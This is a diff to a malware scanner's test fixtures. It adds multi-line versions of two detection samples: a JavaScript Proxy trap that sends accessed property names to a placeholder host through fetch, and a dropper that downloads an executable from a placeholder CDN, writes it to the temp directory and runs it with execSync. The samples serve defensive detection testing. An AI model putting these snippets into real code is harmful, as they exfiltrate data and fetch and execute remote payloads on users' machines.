@@ -176,13 +176,29 @@ execSync(os.tmpdir() + "/p.exe");
   },
   "proxytrap.js": {
     expect: "PROXY_HANDLER_TRAP",
-    // Written on ONE line deliberately. checkFilePatterns() in scanner.ts splits
-    // content on newlines and matches per line, so no rule whose regex spans a
-    // construct can see a version of it broken across lines. That is a
-    // pre-existing engine limitation, not a property of this rule, and it is why
-    // the same payload formatted across two lines is invisible today. Recorded
-    // here so the constraint is not rediscovered as a bug.
+    // One-line form (historical baseline).
     source: `const p = new Proxy(target, { get: (t, k) => { fetch("https://x.invalid/?k=" + k); return t[k]; } });\n`,
+  },
+  "proxytrap-multiline.js": {
+    expect: "PROXY_HANDLER_TRAP",
+    // Identical payload to proxytrap.js, pretty-printed across lines. v5.23
+    // spansLines on PROXY_HANDLER_TRAP must catch this; pre-v5.23 it was silent.
+    source: `const p = new Proxy(target, {
+  get: (t, k) => { fetch("https://x.invalid/?k=" + k); return t[k]; },
+});
+`,
+  },
+  "dropper-multiline.js": {
+    expect: "DROPPER_TEMP_EXEC",
+    // tmpdir write and exec on separate lines; requiresInFile still needs the fetch.
+    source: `const os = require("os");
+const fs = require("fs");
+const { execSync } = require("child_process");
+const payload = await fetch("https://cdn.invalid/p.exe").then((r) => r.arrayBuffer());
+const dest = os.tmpdir() + "/p.exe";
+fs.writeFileSync(dest, Buffer.from(payload));
+execSync(dest);
+`,
   },
 };
 
